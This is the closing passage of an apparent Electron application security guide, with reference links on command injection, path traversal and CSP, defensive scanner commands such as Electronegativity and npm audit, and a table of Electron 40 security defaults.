- [Pentesting Electron Applications - YesWeHack](https://blog.yeswehack.com/yeswerhackers/exploitation/pentesting-electron-applications/) - Pentesting guide

### Node.js Security

- [NodeJS Command Injection Guide: Examples and Prevention](https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/) - Command injection prevention
- [Preventing Command Injection Attacks in Node.js Apps](https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/) - Auth0 guide
- [An Introduction to Command Injection Vulnerabilities in Node.js](https://www.nodejs-security.com/blog/introduction-command-injection-vulnerabilities-nodejs-javascript) - Detailed analysis

### Path Traversal

- [Path Traversal | OWASP Foundation](https://owasp.org/www-community/attacks/Path_Traversal) - OWASP guide
- [Beyond dot dot slash: path traversal guide – YesWeHack](https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks) - Advanced techniques
- [CVE-2018-1000006: Directory Traversal in electron | Snyk](https://security.snyk.io/vuln/npm:electron:20180123) - Historical vulnerability

### Content Security Policy

- [Electron CSP ⟶ Avoiding the Insecure Warning](https://content-security-policy.com/examples/electron/) - CSP configuration examples
- [How to setup CSP and CORS in electron.js?](https://medium.com/@yashsomkuwar/how-to-setup-csp-and-cors-in-electron-js-b93b05c5bda2) - Tutorial

### CybersecKB References

- [CybersecKB: MITRE ATT&CK T1218.015] - Electron Applications technique
- [CybersecKB: OWASP Secure Code Review] - Code review methodology
- [CybersecKB: Path Traversal Payloads] - Attack vectors

---

## Appendix: Security Tools

### Automated Security Scanners

```bash
# Electronegativity - Electron security scanner
npm install -g @doyensec/electronegativity
electronegativity --input . --output security-report.sarif

# npm audit - Dependency vulnerabilities
npm audit --production

# Snyk - Comprehensive security scanning
npx snyk test
npx snyk monitor

# eslint-plugin-security - JavaScript security linting
npm install --save-dev eslint-plugin-security
```

### Manual Testing Tools

```bash
# Burp Suite - Intercept IPC messages
# OWASP ZAP - Web security testing
# DevTools - Network, console monitoring
# Process Explorer/Monitor - Runtime analysis
```

---

## Quick Reference: Security Defaults for Electron 40

| Setting                       | Value   | Enforced Since |
| ----------------------------- | ------- | -------------- |
| `nodeIntegration`             | `false` | Electron 5.0   |
| `contextIsolation`            | `true`  | Electron 12.0  |
| `sandbox`                     | `true`  | Electron 20.0  |
| `enableRemoteModule`          | Removed | Electron 14.0  |
| `webSecurity`                 | `true`  | Always         |
| `allowRunningInsecureContent` | `false` | Always         |

**Summary**: If you're using Electron 40 with default settings and following this guide, you have a strong security foundation. However, **always validate inputs, sanitize outputs, and test your security controls**.

---

_Document Version: 1.0_
_Last Updated: January 21, 2026_
_Electron Version: 40.0.0_
